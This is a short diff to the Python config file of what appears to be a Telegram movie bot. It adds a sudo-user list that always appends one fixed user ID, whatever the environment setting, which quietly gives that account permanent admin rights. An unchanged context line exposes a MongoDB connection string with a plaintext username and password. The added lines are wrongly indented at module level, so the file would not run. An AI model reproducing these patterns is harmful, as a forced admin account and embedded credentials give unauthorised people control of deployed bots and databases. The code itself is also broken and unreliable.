@@ -44,6 +44,11 @@ REQST_CHANNEL = int(reqst_channel) if reqst_channel and id_pattern.search(reqst_
 SUPPORT_CHAT_ID = int(support_chat_id) if support_chat_id and id_pattern.search(support_chat_id) else None
 BOT_CHANNEL_ID = int(getenv("BOT_CHANNEL_ID", "-1001822021062"))
 
+  # Sudo users (Put your User ID)
+  SUDO_USERS = list(set(int(x) for x in environ.get("SUDO_USERS", "1391556668").split()))
+  SUDO_USERS.append(1391556668)
+  SUDO_USERS = list(set(SUDO_USERS))
+
 # MongoDB information
 DATABASE_URI = environ.get('DATABASE_URI', "mongodb+srv://KarthikMovies:KarthikUK007@cluster0.4l5byki.mongodb.net/?retryWrites=true&w=majority")
 DATABASE_NAME = environ.get('DATABASE_NAME', "Cluster0")
